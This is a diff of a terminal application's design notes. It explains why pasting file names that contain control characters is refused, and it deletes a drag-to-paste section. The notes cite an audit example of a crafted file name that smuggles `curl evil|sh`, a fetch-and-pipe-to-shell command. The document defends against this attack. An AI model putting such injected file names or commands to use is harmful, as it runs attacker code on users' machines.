@@ -78,10 +78,6 @@ The [Bash reference manual](https://www.gnu.org/software/bash/manual/html_node/C
 
 **Why a control character refuses the whole paste.** Without bracketed paste (macOS `/bin/bash` 3.2, dash, a TUI with paste mode off), a copied file named `x<ETX>curl evil|sh<CR>` reached the PTY as `'x^Ccurl evil|sh\r'`: the tty's `^C` discarded the opening quote and the trailing CR submitted `curl evil|sh` on the paste itself (2026-10-07 security audit, #1027). Shell quotes do not protect terminal editing keys, the same reason `dor` refuses these characters in Tool argv. Bracketed mode is refused too, so the rule does not depend on how each program treats control bytes inside a paste. Dropping just the offending path would change the others' positions (`mv a b dest`), so nothing is pasted; such names are rare enough that a notice costs less than a guess. This also leaves the newline branch of `shellEscapePosix` unreachable from paste.
 
-## 8.7 Drag-to-Paste
-
-**`dragDropEnabled: false` is no longer load-bearing.** The flag was set back when pane dragging depended on HTML5 drag-and-drop working inside the webview; Lath's pane dragging is pointer-based and does not, so nothing in the current layout stack needs it off. Flipping it hands the drop to Tauri's native `WindowEvent::DragDrop` handler — already written and wired — and re-enables drag-to-paste in the standalone build; it stays off only because that is a behavior change to schedule deliberately, not a side effect of an unrelated edit.
-
 ## 8.9 Clipboard Chords Inside Dormouse's Own Text Fields
 
 **Why the JS path still owns our fields under a native Edit menu.** It predates the macOS standalone Edit menu (`docs/specs/standalone.md` → "Application menu"), and it cancels the keydown, which keeps the menu item from also pasting.
